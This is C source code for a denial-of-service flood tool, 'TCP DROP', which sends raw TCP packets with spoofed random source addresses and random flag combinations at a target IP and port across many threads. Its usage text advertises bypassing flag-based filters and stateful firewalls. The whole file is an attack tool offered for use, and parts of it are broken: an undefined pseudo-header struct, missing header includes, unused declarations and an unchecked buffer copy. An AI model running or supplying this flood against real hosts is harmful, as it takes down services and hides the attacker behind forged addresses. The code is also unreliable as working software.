#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <pthread.h>

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int threads;
    int min_delay;
    int max_delay;
} drop_params;

struct tcp_header {
    unsigned short src_port;
    unsigned short dst_port;
    unsigned int seq_num;
    unsigned int ack_num;
    unsigned char data_offset;
    unsigned char flags;
    unsigned short window;
    unsigned short checksum;
    unsigned short urgent_ptr;
};

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;
    
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }
    
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    
    return answer;
}

void *tcp_drop(void *arg) {
    drop_params *params = (drop_params *)arg;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        return NULL;
    }
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    dest.sin_addr.s_addr = inet_addr(params->target_ip);
    
    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    time_t end_time = time(NULL) + params->duration;
    unsigned int src_ip;
    unsigned int base_seq = rand();
    unsigned int base_ack = rand();
    
    int flags[6] = {0, 1, 2, 4, 8, 16};
    int flag_names[6] = {0, 1, 2, 4, 8, 16};
    
    while (time(NULL) < end_time) {
        src_ip = rand() | (rand() << 16);
        
        memset(packet, 0, 4096);
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = rand();
        iph->frag_off = 0;
        iph->ttl = 128;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = src_ip;
        iph->daddr = dest.sin_addr.s_addr;
        
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(params->target_port);
        tcph->seq = htonl(base_seq + (rand() % 1000));
        tcph->ack_seq = htonl(base_ack + (rand() % 1000));
        tcph->doff = 5;
        
        int flag_set = flags[rand() % 6];
        tcph->fin = (flag_set & 1) ? 1 : 0;
        tcph->syn = (flag_set & 2) ? 1 : 0;
        tcph->rst = (flag_set & 4) ? 1 : 0;
        tcph->psh = (flag_set & 8) ? 1 : 0;
        tcph->ack = (flag_set & 16) ? 1 : 0;
        tcph->urg = 0;
        
        tcph->window = htons(rand() % 65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        struct pseudo_header psh;
        psh.src_addr = src_ip;
        psh.dst_addr = dest.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
        
        tcph->check = checksum((unsigned short*)&psh, sizeof(struct pseudo_header));
        
        sendto(sock, packet, iph->tot_len, 0, 
               (struct sockaddr *)&dest, sizeof(dest));
        
        if (params->min_delay > 0 || params->max_delay > 0) {
            int delay = params->min_delay;
            if (params->max_delay > params->min_delay) {
                delay = params->min_delay + (rand() % (params->max_delay - params->min_delay));
            }
            usleep(delay);
        }
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║              TCP DROP                    ║\n");
    printf("║         Random Flag Flood                ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");
    
    if (argc < 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS> [MIN_DELAY] [MAX_DELAY]\n", argv[0]);
        printf("Example: %s 1.1.1.1 80 60 100\n", argv[0]);
        printf("Example with delay: %s 1.1.1.1 80 60 100 10 100\n", argv[0]);
        printf("\nTCP DROP sends packets with random TCP flags:\n");
        printf("- SYN, ACK, FIN, RST, PSH in random combinations\n");
        printf("- Bypasses filters looking for specific flags\n");
        printf("- Confuses stateful inspection firewalls\n");
        return 1;
    }
    
    srand(time(NULL));
    
    drop_params params;
    params.target_port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    params.threads = atoi(argv[4]);
    strcpy(params.target_ip, argv[1]);
    
    if (argc >= 6) {
        params.min_delay = atoi(argv[5]);
    } else {
        params.min_delay = 0;
    }
    
    if (argc >= 7) {
        params.max_delay = atoi(argv[6]);
    } else {
        params.max_delay = params.min_delay;
    }
    
    printf("[+] Target: %s:%d\n", params.target_ip, params.target_port);
    printf("[+] Duration: %d seconds\n", params.duration);
    printf("[+] Threads: %d\n", params.threads);
    printf("[+] Delay: %d-%d microseconds\n", params.min_delay, params.max_delay);
    printf("[+] Mode: Random TCP Flags (SYN/ACK/FIN/RST/PSH)\n");
    printf("[+] Bypass: Stateful inspection, flag-based filters\n\n");
    
    pthread_t threads[params.threads];
    
    for (int i = 0; i < params.threads; i++) {
        pthread_create(&threads[i], NULL, tcp_drop, &params);
        usleep(100);
    }
    
    for (int i = 0; i < params.threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n[+] Attack completed\n");
    return 0;
}